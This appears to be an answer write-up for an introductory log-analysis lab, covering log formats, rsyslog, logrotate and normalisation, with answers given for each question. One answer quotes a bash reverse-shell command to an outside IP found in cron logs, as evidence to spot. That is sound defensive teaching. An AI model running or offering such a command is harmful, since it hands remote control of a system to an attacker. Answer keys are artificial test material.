# Intro to Logs

### Expanding Perspectives: Logs as Evidence of Historical Activity
- What is the name of your colleague who left a note on your Desktop?<br />
![image](https://github.com/user-attachments/assets/9c9a98f9-8579-4590-8307-1c3cd072eede)<br />
`Perry`
- What is the full path to the suggested log file for initial investigation? `/var/log/gitlab/nginx/access.log`

### Types, Formats, and Standards
- Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2? `Web Server Log`
- Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2? `Combined`

### Collection, Management, and Centralisation
- After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?<br />
![image](https://github.com/user-attachments/assets/6a5ee6c2-87e1-4ed2-90f9-0cd97070c5a3)<br />
`stansimon`
- What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?<br />
![image](https://github.com/user-attachments/assets/3977514e-d1a5-49a5-b60e-f3d83866515b)<br />
`10.10.10.101`
- Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?<br />
![image](https://github.com/user-attachments/assets/0eb6cf9a-4a88-4588-90dd-a2ce1700507a)<br />
`/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`

### Storage, Retention, and Deletion
- Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?<br />
![image](https://github.com/user-attachments/assets/3599e368-3650-402a-8a49-c1d9b7bdc233)<br />
`24`
- Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency? `hourly`

### Hands-on Exercise: Log analysis process, tools, and techniques
- Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?<br />
![image](https://github.com/user-attachments/assets/22779fde-1888-40e4-951e-8d9a38af0120)<br />
`No date field`
- What is the process of standardising parsed data into a more easily readable and query-able format? `Normalisation`
- What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address? `Enrichment`
